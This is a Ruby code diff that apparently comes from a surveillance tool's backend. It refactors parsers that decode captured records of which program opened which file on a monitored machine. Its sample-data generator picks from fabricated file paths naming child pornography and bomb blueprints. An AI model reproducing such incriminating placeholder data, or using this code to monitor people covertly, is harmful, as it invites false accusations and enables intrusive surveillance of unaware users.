@@ -9,8 +9,8 @@ module FileopenEvidence
   ELEM_DELIMITER = 0xABADC0DE
 
   def content
-    process = "Explorer.exe\0".encode("US-ASCII")
-    file = "c:\\Utenti\\pippo\\pedoporno.mpg".to_utf16le_binary_null
+    process = ["Explorer.exe\0", "Firefox.exe\0", "Chrome.exe\0"].sample.encode("US-ASCII")
+    file = ["c:\\Utenti\\pippo\\pedoporno.mpg", "c:\\Utenti\\pluto\\Documenti\\childporn.avi", "c:\\secrets\\bomb_blueprints.pdf"].sample.to_utf16le_binary_null
     content = StringIO.new
     t = Time.now.getutc
     content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
@@ -29,35 +29,34 @@ module FileopenEvidence
     ret
   end
   
-  def decode_content
-    stream = StringIO.new @info[:chunks].join
+  def decode_content(common_info, chunks)
+    stream = StringIO.new chunks.join
 
-    evidences = Array.new
     until stream.eof?
+      info = Hash[common_info]
+      info[:data] = Hash.new
+
       tm = stream.read 36
-      @info[:acquired] = Time.gm(*tm.unpack('l*'), 0)
-      @info[:data][:program] = ''
-      @info[:data][:path] = ''
+      info[:acquired] = Time.gm(*tm.unpack('l*'), 0)
+      info[:data][:program] = ''
+      info[:data][:path] = ''
 
       process_name = stream.read_ascii_string
-      @info[:data][:program] = process_name.force_encoding('US-ASCII') unless process_name.nil?
+      info[:data][:program] = process_name.force_encoding('US-ASCII') unless process_name.nil?
 
       size_hi = stream.read(4).unpack("L").first
       size_lo = stream.read(4).unpack("L").first
-      @info[:data][:size] = size_hi << 32 | size_lo
-      @info[:data][:access] = stream.read(4).unpack("l").first
+      info[:data][:size] = size_hi << 32 | size_lo
+      info[:data][:access] = stream.read(4).unpack("l").first
 
       file = stream.read_utf16le_string
-      @info[:data][:path] = file.utf16le_to_utf8 unless file.nil?
+      info[:data][:path] = file.utf16le_to_utf8 unless file.nil?
       
       delim = stream.read(4).unpack("L*").first
       raise EvidenceDeserializeError.new("Malformed FILEOPEN (missing delimiter)") unless delim == ELEM_DELIMITER
 
-      # this is not the real clone! redefined clone ...
-      evidences << self.clone
+      yield info if block_given?
     end
-    
-    return evidences
   end
 end
 
@@ -91,13 +90,18 @@ module FilecapEvidence
     version, file_name_len = binary.read(8).unpack("I*")
     raise EvidenceDeserializeError.new("invalid log version for FILECAP") unless version == FILECAP_VERSION
 
-    @info[:data][:path] = binary.read(file_name_len).utf16le_to_utf8
+    ret = Hash.new
+    ret[:data] = Hash.new
+    ret[:data][:path] = binary.read(file_name_len).utf16le_to_utf8
+    return ret
   end
 
-  def decode_content
-    @info[:grid_content] = @info[:chunks].first
-    @info[:data][:md5] = Digest::MD5.hexdigest @info[:chunks].first
-    return [self]
+  def decode_content(common_info, chunks)
+    info = Hash[common_info]
+    info[:data] = Hash.new
+    info[:grid_content] = chunks.first
+    info[:data][:md5] = Digest::MD5.hexdigest chunks.first
+    yield info if block_given?
   end
 end
 
